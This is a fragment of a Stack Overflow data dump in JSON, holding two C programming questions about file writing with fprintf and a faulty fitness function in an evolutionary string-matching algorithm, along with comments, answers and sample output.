fclose(fp);\n</code></pre>\n\n<p>And then if you want to break sentence in number of strings you can make use of <code>sscanf</code> -<a href=\"http://www.tutorialspoint.com/c_standard_library/c_function_sscanf.htm\" rel=\"nofollow\">http://www.tutorialspoint.com/c_standard_library/c_function_sscanf.htm</a></p>\n"}], "owner": {"reputation": 536, "user_id": 4253848, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/100001877465512/picture?type=large", "display_name": "Frank Tocci", "link": "https://stackoverflow.com/users/4253848/frank-tocci"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 86, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1437540464, "creation_date": 1437534360, "question_id": 31553152, "link": "https://stackoverflow.com/questions/31553152/writing-to-file-yet-cant-find-data-when-i-pull-the-file-up-from-desktop", "title": "Writing to file, yet can&#39;t find data when I pull the file up from desktop", "body": "<p>I'm running into a rather bizarre problem here. I'm using fopen and fprintf to write a sentence to a file:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;math.h&gt;\n#include &lt;string.h&gt;\n\nint main (void) {\n    FILE *fp;\n    fp = fopen(\"wageData.txt\",\"w\");\n    fprintf(fp, \"Hi, I like pie\");\n    return 0;\n}\n</code></pre>\n\n<p>Yet when I open up wageData.txt on the desktop, there is absolutely nothing in it. On the other hand, if I try reading the file, I get the information:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main (void) {\n    //FILE *fp;\n    //fp = fopen(\"wageData.txt\",\"r+\");\n    FILE *c;\n    if ((c = fopen(\"wageData.txt\",\"r\")) == NULL)\n        printf(\"File not available\");\n    else {\n        char x[3][6];\n        int i = 0;\n\n        while (fgets(x[i], 30, c) != NULL) {\n            i++;\n        }\n\n        for (i = 0; i &lt; 6; i++) {\n            printf(\"%s\\n\", x[i]);\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Compiled, it results in:</p>\n\n<pre><code>Hi, I like pie\nlike pie\nie\n[?\n m?i\u0556\n\nlogout\n\n[Process completed]\n</code></pre>\n\n<p>Can somebody please tell me what is going on here? Thanks in advance.</p>\n"}, {"tags": ["c", "evolutionary-algorithm", "fitness"], "comments": [{"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 0, "creation_date": 1437532417, "post_id": 31552887, "comment_id": 51063763, "body": "Specify sample input, what fitness value you expect, and what fitness value you actually get."}, {"owner": {"reputation": 323, "user_id": 2119587, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f50aadf631b72398aa272119e8a3cdd6?s=128&d=identicon&r=PG", "display_name": "Pedro", "link": "https://stackoverflow.com/users/2119587/pedro"}, "reply_to_user": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 0, "creation_date": 1437532950, "post_id": 31552887, "comment_id": 51063873, "body": "I can&#39;t because the function is inside a loop that iterates until the matched string is the same as the original string."}, {"owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "edited": false, "score": 0, "creation_date": 1437533926, "post_id": 31552887, "comment_id": 51064093, "body": "So you cannot use printf to print it out as it changes and you can also not use the debugger?"}, {"owner": {"reputation": 323, "user_id": 2119587, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f50aadf631b72398aa272119e8a3cdd6?s=128&d=identicon&r=PG", "display_name": "Pedro", "link": "https://stackoverflow.com/users/2119587/pedro"}, "edited": false, "score": 0, "creation_date": 1437534275, "post_id": 31552887, "comment_id": 51064183, "body": "I tought he meant like an written thing. I&#39;ll post the sample output"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437535108, "post_id": 31552887, "comment_id": 51064392, "body": "Using <code>n</code> and <code>strcmp()</code> is suspicious.  Why is <code>n</code> needed?  Is code generating null characters in the randomly generated string?"}, {"owner": {"reputation": 323, "user_id": 2119587, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f50aadf631b72398aa272119e8a3cdd6?s=128&d=identicon&r=PG", "display_name": "Pedro", "link": "https://stackoverflow.com/users/2119587/pedro"}, "edited": false, "score": 0, "creation_date": 1437535390, "post_id": 31552887, "comment_id": 51064457, "body": "n is needed to make sure I do not exceed the string size, also to make sure that the mutation position is withing the string range. The code does not generate null characters, only the ones within the set = &quot;abcdefghijklmnopqrstuvwxyz &quot; (thats a space in the end)"}, {"owner": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "edited": false, "score": 0, "creation_date": 1437538914, "post_id": 31552887, "comment_id": 51065295, "body": "Try changing your loop to: for (i=n; i--;)"}, {"owner": {"reputation": 323, "user_id": 2119587, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f50aadf631b72398aa272119e8a3cdd6?s=128&d=identicon&r=PG", "display_name": "Pedro", "link": "https://stackoverflow.com/users/2119587/pedro"}, "reply_to_user": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "edited": false, "score": 0, "creation_date": 1437539251, "post_id": 31552887, "comment_id": 51065377, "body": "@Pynchia this didn&#39;t work. I&#39;m still getting the same false fitness values."}, {"owner": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "edited": false, "score": 0, "creation_date": 1437539459, "post_id": 31552887, "comment_id": 51065442, "body": "Ok. Just be aware your loop was not considering the first char (index zero)"}, {"owner": {"reputation": 323, "user_id": 2119587, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f50aadf631b72398aa272119e8a3cdd6?s=128&d=identicon&r=PG", "display_name": "Pedro", "link": "https://stackoverflow.com/users/2119587/pedro"}, "reply_to_user": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "edited": false, "score": 0, "creation_date": 1437540853, "post_id": 31552887, "comment_id": 51065831, "body": "@Pynchia Thank you very much, I wasn&#39;t aware of that. I might keep the simulation going overnight, to see if there&#39;s any improvements."}, {"owner": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "edited": false, "score": 0, "creation_date": 1437541072, "post_id": 31552887, "comment_id": 51065913, "body": "Nah. Print the strings and fit within the loop and see what happens on each cycle"}, {"owner": {"reputation": 323, "user_id": 2119587, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f50aadf631b72398aa272119e8a3cdd6?s=128&d=identicon&r=PG", "display_name": "Pedro", "link": "https://stackoverflow.com/users/2119587/pedro"}, "reply_to_user": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "edited": false, "score": 0, "creation_date": 1437599042, "post_id": 31552887, "comment_id": 51102775, "body": "@Pynchia i&#39;m getting random strings that have their fitness increased seemly randomly. It&#39;s the same thing as the example output that I posted above."}, {"owner": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "edited": false, "score": 0, "creation_date": 1437600751, "post_id": 31552887, "comment_id": 51103669, "body": "Your code has several weird/incorrect details. I do not know where the problem lies, but I can tell you it&#39;s going to be a silly one"}, {"owner": {"reputation": 323, "user_id": 2119587, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f50aadf631b72398aa272119e8a3cdd6?s=128&d=identicon&r=PG", "display_name": "Pedro", "link": "https://stackoverflow.com/users/2119587/pedro"}, "reply_to_user": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "edited": false, "score": 0, "creation_date": 1437692564, "post_id": 31552887, "comment_id": 51150544, "body": "@Pynchia would you mind elaborating where I went wrong?"}, {"owner": {"reputation": 1290, "user_id": 3227815, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/932904f6217c372e891e1a36631019f1?s=128&d=identicon&r=PG&f=1", "display_name": "Katie", "link": "https://stackoverflow.com/users/3227815/katie"}, "edited": false, "score": 0, "creation_date": 1438970938, "post_id": 31552887, "comment_id": 51685792, "body": "Why are you iterating backwards? That&#39;s just asking for confusion... I would drop the n=0 strcmp logic, and just loop from 0 to n-1 counting up matches. The n=0 case is covered because the loop will just terminate immediately. If the strings match, then you&#39;ll return n, which is the maximum - no need for a 999999 value. You can eliminate n completely by just looping until you see a null character - I assume that since you used strcmp they must be null-terminated."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 2579915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/776d048f93eb9cac2b1bbc44c557b4a8?s=128&d=identicon&r=PG", "display_name": "dubi", "link": "https://stackoverflow.com/users/2579915/dubi"}, "is_accepted": false, "score": 0, "last_activity_date": 1438968577, "creation_date": 1438968577, "answer_id": 31883494, "question_id": 31552887, "link": "https://stackoverflow.com/questions/31552887/evolutionary-algorithm-hitting-a-constant-fitness-value/31883494#31883494", "title": "Evolutionary algorithm hitting a constant fitness value", "body": "<p>The call to your function is:</p>\n\n<p>fitness[i] = closeness (specimen[i], target, size);</p>\n\n<p>and size is:</p>\n\n<p>char target[] = \"methinks\";\nsize = sizeof (target);</p>\n\n<p>Every string in c ends with a char '\\0', so all the string-functions know, where the strings end. If you start comparing two strings at the position sizeof(target)-1, it will compare the both '\\0' first (which are equal, logically) and then compare the rest.</p>\n\n<p>Furthermore I would change the loop to:</p>\n\n<p>for (i = n - 1; i >= 0; i--)</p>\n\n<p>Otherwise, the first character won't be compared.</p>\n\n<p>Let me know, if this fixed your problem. ;)</p>\n"}, {"tags": [], "owner": {"reputation": 1290, "user_id": 3227815, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/932904f6217c372e891e1a36631019f1?s=128&d=identicon&r=PG&f=1", "display_name": "Katie", "link": "https://stackoverflow.com/users/3227815/katie"}, "is_accepted": false, "score": 0, "last_activity_date": 1438971744, "creation_date": 1438971744, "answer_id": 31884301, "question_id": 31552887, "link": "https://stackoverflow.com/questions/31552887/evolutionary-algorithm-hitting-a-constant-fitness-value/31884301#31884301", "title": "Evolutionary algorithm hitting a constant fitness value", "body": "<p>Here's a quick implementation of what I mentioned in my comment above. It eliminates the special-case checks, because the loop takes care of it anyways. There is no need for n because your use of <code>strcmp</code> implies the strings are null-terminated. It doesn't check for equality and put out a magic value, because you already know that an exact match will return the maximum value.</p>\n\n<p>The only potential bug introduced I can think of is if you don't null-terminate strings in cases where you passed n=0 before - this doesn't have a chance to bail out. But if your empty strings start with a null then it is safe.</p>\n\n<p>Beware, I haven't actually tried to compile or test the code.</p>\n\n<pre><code>int closeness(char* string, char* target)\n{\n    int fit = 0;\n    int index = 0;\n    while(string[index] &amp;&amp; target[index])\n    {\n        if(string[index] == target[index])\n            fit++;\n        index++;\n    }\n    return fit;\n}\n</code></pre>\n"}], "owner": {"reputation": 323, "user_id": 2119587, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f50aadf631b72398aa272119e8a3cdd6?s=128&d=identicon&r=PG", "display_name": "Pedro", "link": "https://stackoverflow.com/users/2119587/pedro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1438971744, "creation_date": 1437532299, "last_edit_date": 1437534616, "question_id": 31552887, "link": "https://stackoverflow.com/questions/31552887/evolutionary-algorithm-hitting-a-constant-fitness-value", "title": "Evolutionary algorithm hitting a constant fitness value", "body": "<p>Recently I decided to take on the challenge of evolutionary programming, and following the problem posted at <a href=\"http://rosettacode.org/wiki/Evolutionary_algorithm\" rel=\"nofollow\">Rosetta Code</a>, which says that given a target string, mutate a randomly generated string until it matches the target.\nI've managed to do the mutations just fine, but I'm getting the wrong value for my fitness function, but I have no idea why. My fitness function is:</p>\n\n<pre><code>int\ncloseness (char* string, char* target, int n)\n{\n  int fit = 0, i, j;\n\n  if (n == 0) return 0;\n\n  if (!strcmp (string, target)) return 99999999; //if strings match, no need to iterate\n\n    for (i = n - 1; i &gt; 0; i--)\n      {\n        if ((string[i] == target[i])) fit++; //fit gets increased by each matching letter.\n      }\n\n  return fit;\n</code></pre>\n\n<p>And, for not cluttering the whole post, <a href=\"http://pastebin.com/f5HpCACw\" rel=\"nofollow\">here's the full code (Pastebin)</a>.<br>\nAny Help is appreciated guys.</p>\n\n<p>Sample output (for target string \"methinks\"):</p>\n\n<pre><code>best match: ecskyzfjh in generation 1, specimen 0 with fitness 0\nbest match: ecsuyzfjh in generation 2, specimen 0 with fitness 0\nbest match: ecsuyzfjh in generation 3, specimen 0 with fitness 0\nbest match: vc uyzfjh in generation 4, specimen 0 with fitness 0\nbest match: vc uyzfjh in generation 5, specimen 0 with fitness 0\nbest match: ve uyzfjh in generation 6, specimen 4 with fitness 1\nbest match: ve lyzfjh in generation 7, specimen 4 with fitness 1\nbest match: ve lyzfjh in generation 8, specimen 4 with fitness 1\nbest match: ve lyzfjh in generation 9, specimen 4 with fitness 1\nbest match: ve lyzfjh in generation 10, specimen 4 with fitness 1\nbest match: vg lyzfjh in generation 11, specimen 4 with fitness 1\nbest match: vgalyzfjh in generation 12, specimen 4 with fitness 1\nbest match: vgalyzfjh in generation 13, specimen 4 with fitness 1\nbest match: vgalyzfjh in generation 14, specimen 4 with fitness 1\nbest match: ugalyzfjh in generation 15, specimen 4 with fitness 1\nbest match: ugalyzrjh in generation 16, specimen 4 with fitness 1\nbest match: ugalyhtjh in generation 17, specimen 4 with fitness 1\nbest match: ugalyhtjh in generation 18, specimen 4 with fitness 1\nbest match: ugalyhtjh in generation 19, specimen 4 with fitness 1\nbest match: ugalyhtjz in generation 20, specimen 4 with fitness 1\nbest match: ugalyhtjz in generation 21, specimen 4 with fitness 1\nbest match: ugalyht l in generation 22, specimen 4 with fitness 1\nbest match: ugalyht l in generation 23, specimen 4 with fitness 1\nbest match: ugalyht l in generation 24, specimen 4 with fitness 1\nbest match:  galyyt l in generation 25, specimen 4 with fitness 1\nbest match:  galyyt l in generation 26, specimen 4 with fitness 1\nbest match:  yalyyt l in generation 27, specimen 4 with fitness 1\nbest match:  yalyytil in generation 28, specimen 4 with fitness 1\nbest match:  yalqytil in generation 29, specimen 4 with fitness 1\nbest match: pyajqytil in generation 30, specimen 4 with fitness 1\nbest match: pyajqytil in generation 31, specimen 4 with fitness 1\nbest match: pyajqytio in generation 32, specimen 4 with fitness 1\nbest match: pyajqytio in generation 33, specimen 4 with fitness 1\nbest match: pyazqytio in generation 34, specimen 4 with fitness 1\nbest match: pyazqytio in generation 35, specimen 4 with fitness 1\nbest match: pyazqytio in generation 36, specimen 4 with fitness 1\nbest match: pyazqptio in generation 37, specimen 4 with fitness 1\nbest match: pyazoztuo in generation 38, specimen 4 with fitness 1\nbest match: pyazoztuo in generation 39, specimen 4 with fitness 1\nbest match: pyazoztux in generation 40, specimen 4 with fitness 1\nbest match: hyazont x in generation 41, specimen 4 with fitness 1\nbest match: hyazont y in generation 42, specimen 4 with fitness 1\nbest match: hyazontay in generation 43, specimen 4 with fitness 1\nbest match: hyuzoltay in generation 44, specimen 4 with fitness 1\nbest match: hyuyoltay in generation 45, specimen 4 with fitness 1\nbest match: hyuyoltay in generation 46, specimen 4 with fitness 1\nbest match: hyuyoltay in generation 47, specimen 4 with fitness 1\nbest match: hvuyoltay in generation 48, specimen 4 with fitness 1\nbest match: hvuyoltay in generation 49, specimen 4 with fitness 1\nbest match: hvlyoltly in generation 50, specimen 4 with fitness 1\nbest match: hvlyoltly in generation 51, specimen 4 with fitness 1\nbest match: hvlynltlv in generation 52, specimen 4 with fitness 1\nbest match: hvlynltlv in generation 53, specimen 4 with fitness 1\nbest match: hvlynltlv in generation 54, specimen 4 with fitness 1\nbest match: hvlexltxv in generation 55, specimen 4 with fitness 1\nbest match: hvlexltev in generation 56, specimen 4 with fitness 1\nbest match: hvlexltev in generation 57, specimen 4 with fitness 1\nbest match: hvlexltev in generation 58, specimen 4 with fitness 1\nbest match: lvlexltev in generation 59, specimen 4 with fitness 1\nbest match: lvlexltem in generation 60, specimen 4 with fitness 1\nbest match: lvlexltem in generation 61, specimen 4 with fitness 1\nbest match: lqlexlpem in generation 62, specimen 4 with fitness 1\nbest match: lqlexdpem in generation 63, specimen 4 with fitness 1\nbest match: lylaxdpem in generation 64, specimen 4 with fitness 1\nbest match: lylaxdqem in generation 65, specimen 4 with fitness 1\nbest match: lylsxdqxm in generation 66, specimen 4 with fitness 1\nbest match: lylsidqxm in generation 67, specimen 4 with fitness 1\nbest match:  in generation 68, specimen 4 with fitness 1\nbest match:  in generation 69, specimen 4 with fitness 1\nbest match:  in generation 70, specimen 4 with fitness 1\nbest match:  in generation 71, specimen 4 with fitness 1\nbest match:  in generation 72, specimen 4 with fitness 1\nbest match: ynldqxq q in generation 73, specimen 4 with fitness 1\nbest match: ynhdqxq q in generation 74, specimen 4 with fitness 1\nbest match: znhdqxqkq in generation 75, specimen 4 with fitness 1\nbest match: znhdqxqqq in generation 76, specimen 4 with fitness 1\nbest match: znbdqxqqq in generation 77, specimen 4 with fitness 1\nbest match: znbjqxqqq in generation 78, specimen 4 with fitness 1\nbest match: zbbjqxqqq in generation 79, specimen 4 with fitness 1\nbest match: zbbjqxqpq in generation 80, specimen 4 with fitness 1\nbest match: zbbjqxqpq in generation 81, specimen 4 with fitness 1\nbest match:  bbjqxqpq in generation 82, specimen 4 with fitness 1\nbest match:  bbjqxqpq in generation 83, specimen 4 with fitness 1\nbest match:  bbjqxlpq in generation 84, specimen 4 with fitness 1\nbest match:  brjqxaaq in generation 85, specimen 4 with fitness 1\nbest match:  brjqxaaq in generation 86, specimen 4 with fitness 1\nbest match:  prfqmaaq in generation 87, specimen 4 with fitness 1\nbest match: xprfqmaaq in generation 88, specimen 4 with fitness 1\nbest match: xprfrzaad in generation 89, specimen 4 with fitness 1\nbest match: xpzfrxaad in generation 90, specimen 4 with fitness 1\nbest match: xpefrxaad in generation 91, specimen 4 with fitness 1\nbest match: xgefrxaad in generation 92, specimen 4 with fitness 1\nbest match: xgefruaod in generation 93, specimen 4 with fitness 1\nbest match: dgefruaod in generation 94, specimen 4 with fitness 1\nbest match: dgefruaod in generation 95, specimen 4 with fitness 1\nbest match: dge in generation 96, specimen 4 with fitness 1\nbest match:  in generation 97, specimen 4 with fitness 1\nbest match:  in generation 98, specimen 4 with fitness 1\nbest match:  in generation 99, specimen 4 with fitness 1\nbest match:  in generation 100, specimen 4 with fitness 1\n</code></pre>\n\n<p>The expected fitness for most of them would be 0.</p>\n"}]